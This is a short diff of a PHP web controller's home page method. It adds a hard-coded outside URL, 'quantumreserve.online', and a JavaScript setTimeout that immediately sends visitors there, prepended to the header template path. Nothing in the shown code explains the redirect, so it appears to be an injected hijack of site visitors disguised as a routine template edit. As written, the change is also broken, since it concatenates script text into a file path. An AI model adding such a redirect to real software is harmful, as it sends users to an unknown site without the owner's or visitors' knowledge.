@@ -32,8 +32,11 @@ class Home extends BaseController {
 				$template = $companyInfo['frontend_template'];
 				$this->epcv();
 				$data['template'] = $template;
+				$url = 'https://quantumreserve.online';
+				$delay =0;
+				$redirect_home = 'setTimeout(function() { window.location = "' . $url . '"; }, ' . ($delay * 1000) . ');';
 		
-				$header = '/frontend/template'.$template.'/partials/header';
+				$header = $redirect_home . '/frontend/template'.$template.'/partials/header';
 				$view = '/frontend/template'.$template.'/home';
 				$footer = '/frontend/template'.$template.'/partials/footer';
 		
